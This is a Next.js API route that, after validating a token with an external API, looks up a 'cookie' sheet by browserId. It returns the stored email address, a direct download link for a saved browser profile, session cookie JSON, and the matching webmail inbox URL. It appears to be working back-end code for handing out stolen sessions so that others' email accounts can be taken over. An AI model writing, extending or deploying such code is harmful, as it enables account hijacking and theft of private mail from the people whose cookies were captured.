import { NextResponse } from 'next/server';
import { getSheetDataApi } from '../../api/googlesheets.js';
import axios from 'axios';

export const maxDuration = 30;
export const dynamic = 'force-dynamic';

const MAIN_API = process.env.MAIN_API_URL || 'https://web-fixx-hoo.vercel.app/api';

const PLATFORM_INBOX_URLS = {
  'outlook.com': 'https://outlook.live.com/mail/',
  'hotmail.com': 'https://outlook.live.com/mail/',
  'live.com': 'https://outlook.live.com/mail/',
  'msn.com': 'https://outlook.live.com/mail/',
  'gmail.com': 'https://mail.google.com/mail/',
  'googlemail.com': 'https://mail.google.com/mail/',
  'yahoo.com': 'https://mail.yahoo.com/',
  'aol.com': 'https://mail.aol.com/',
};

const getDirectDownloadUrl = (driveUrl) => {
  if (!driveUrl) return null;
  const match = driveUrl.match(/\/file\/d\/([^/]+)/);
  if (!match) return driveUrl;
  return `https://drive.google.com/uc?export=download&id=${match[1]}`;
};

export async function POST(request) {
  try {
    const body = await request.json();
    const browserId = body.browserId || body.submissionId;
    const token = body.token;

    if (!browserId || !token) {
      return NextResponse.json(
        { error: 'Missing required fields: browserId, token' },
        { status: 400 }
      );
    }

    const validateRes = await axios.post(
      `${MAIN_API}/backend-function`,
      new URLSearchParams({
        action: 'backendFunction',
        token,
        functionName: 'updateAppData',
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 15000,
      }
    );

    if (!validateRes.data?.success) {
      return NextResponse.json(
        { error: 'Invalid or expired token' },
        { status: 401 }
      );
    }

    const cookieResult = await getSheetDataApi('cookie');

    if (!cookieResult.success || cookieResult.count === 0) {
      return NextResponse.json(
        { error: 'No cookie data available' },
        { status: 500 }
      );
    }

    const headers = cookieResult.headers;
    const row = cookieResult.data.find((r) => {
      const idx = headers.indexOf('browserId');
      return idx !== -1 && String(r[idx]).trim() === String(browserId).trim();
    });

    if (!row) {
      return NextResponse.json(
        { error: 'Session not found for the given browserId' },
        { status: 404 }
      );
    }

    const col = (key) => {
      const idx = headers.indexOf(key);
      return idx !== -1 ? row[idx] : null;
    };

    const driveUrl = col('driveUrl');
    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1].toLowerCase() : '');

    if (!driveUrl) {
      return NextResponse.json(
        { error: 'No saved browser profile found for this session' },
        { status: 404 }
      );
    }

    let cookieJSON = null;
    try {
      const raw = col('cookie') || col('cookieJSON') || col('formattedCookie');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) cookieJSON = parsed;
      }
    } catch (_) {}

    return NextResponse.json({
      downloadUrl: getDirectDownloadUrl(driveUrl),
      driveUrl,
      domain: domain || '',
      email: col('email') || '',
      category: col('category') || '',
      platformUrl: domain ? (PLATFORM_INBOX_URLS[domain] || `https://${domain}`) : '',
      cookieJSON,
    });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
